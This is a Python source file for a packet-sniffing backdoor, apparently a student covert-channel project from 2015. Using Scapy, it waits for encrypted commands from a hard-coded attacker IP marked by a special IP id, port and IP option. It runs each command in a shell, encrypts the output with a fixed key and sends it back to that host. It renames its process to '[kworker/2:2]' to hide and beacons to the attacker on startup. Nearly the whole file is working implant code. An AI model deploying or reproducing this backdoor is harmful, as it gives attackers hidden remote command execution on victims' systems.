#!/usr/bin/env python
# ###################################################################
# bd_server.py 
# 
#	This script is to sniff command input from the hacker, and 
#	execute the command line from the local machine, and send
#	back the result to the hacker. The data is all encrypted while
#	transferring. 
#
#	The program is using Scapy python library that actually I can 
#	forge the packet whatevet I want
#
#
# 	Theses are main functions:
#	- 0. when this program is run, change the process name
#	- 1. send initial packet that backdoor client program is run to server
#	- 2. wait for command from backdoor server (sniffing)
#	- 3. extract the command data
#	- 4. excute the command data
#	- 5. get the result from command line
#	- 6. encrypt the data to send
#	- 7. send encrypted data to backdoor server
#	
#	Author:			Ben Kim
#
#	Date:			Oct 15 2015
#	
#	run:			python bd_server.py  
#					
#	Further Improvements:
#	The script cannot handle a large amount of data in a packet.
#	Scapy sniffs wrong packet even I set the right rules sometimes.
#
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys
import string
import threading
import setproctitle 
import fcntl


NETCARD = 'enp0s3'
KEY = "runningman"	# used for decryption
src_ip = "192.168.0.17"	# Local IP address
dst_ip = "192.168.0.9"	# change destination IP HERE


# ###################################################################
#	Function: get_ip_address
#	Input: 
#		- ifname : network interface name
#
#	Return:	local IP address
#	Description:	
#		- returns get the local IP address
#
# ###################################################################
def get_ip_address(ifname):
	print "def get_ip_address(ifname):"
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(
	    s.fileno(),
	    0x8915,  # SIOCGIFADDR
	    struct.pack('256s', ifname[:15])
	)[20:24])

# ###################################################################
#	Function: recv_cmd
#	Input: 
#		- pkt : Packet from hacker which contains encrypted command 
#				line data
#	Return:	None
#	Description:	
#		- first it will filter the packet to check if the packet is 
#			actually from the hacker side (blackhat.py). If yes, it
#			will get the data from Raw field and decrypt the data.
#			It will execute command from local machine and get the 
#			results back. Encrypt the result data and send back to 
#			hacker.
#
# ###################################################################
def recv_cmd(pkt):
	global dst_ip

	if ARP in pkt:	# check if the packet has APR packet
		return
	elif DHCP in pkt:	# check if the packet has DHCP packet
		return
	elif UDP in pkt:	# check if the packet has UDP packet
		return
	elif pkt[IP].options != None and pkt[IP].id == 7777:	# check option exists and packet IP id header
		if pkt[IP].src == dst_ip :  	# check IP address if it is from hacker machine
			if pkt[TCP].dport == 14156:		# check TCP dst port
				# get command from backdoor server
				enc_cmd = pkt['Raw'].load

				# decrypt command
				cmd = decrypt(enc_cmd, KEY)

				# execute command
				p = subprocess.Popen(cmd, 
									shell=True,
									stdout=subprocess.PIPE,
									stderr=subprocess.PIPE,
									stdin=subprocess.PIPE)
				output, err = p.communicate()
				cmd_output = output + err

				# encrypt data
				enc_cmd_output = encrypt(cmd_output, KEY)
				
				try:
					# send to server
					send_to_client(enc_cmd_output)
				except socket.error as e:	# socket error handling
					print e 				# sometimes it generates data too large error
					enc_cmd_output = encrypt(str(e), KEY)	
					send(IP(dst=dst_ip, id=7777, options=IPOption('\x83\x03\x10'))/(TCP(dport=14156))/Raw(load=enc_cmd_output))

# ###################################################################
#	Function: send_to_client
#	Input: 
#		- output : result encrypted data to send to hacker 
#
#	Return: None
#	Description:	
#		- This will send encrypted data to hacker
#
# ###################################################################
def send_to_client(output):
	# send encrypted data to hacker
	send(IP(dst=dst_ip, id=7777, options=IPOption('\x83\x03\x10'))/(TCP(dport=14156))/Raw(load=output))


# ###################################################################
#	Function: main
#	Input:	None
#		
#	Return: None
#	Description:	
#		sniffs packet from hacker machine. When a packet comes execute
#		recv_cmd function
#
# ###################################################################
def main():
	# sniffs packet from hacker machine.
	sniff(filter="src {} and tcp".format(dst_ip), prn=recv_cmd)	

if __name__ == '__main__':
	try:
		# change the process title
		title = "[kworker/2:2]"
		setproctitle.setproctitle(title)

		# get the local IP address
		src_ip = get_ip_address(NETCARD)

		# send initial packet that backdoor program is run to hacker
		send(IP(dst=dst_ip, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start', loop=0)

		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")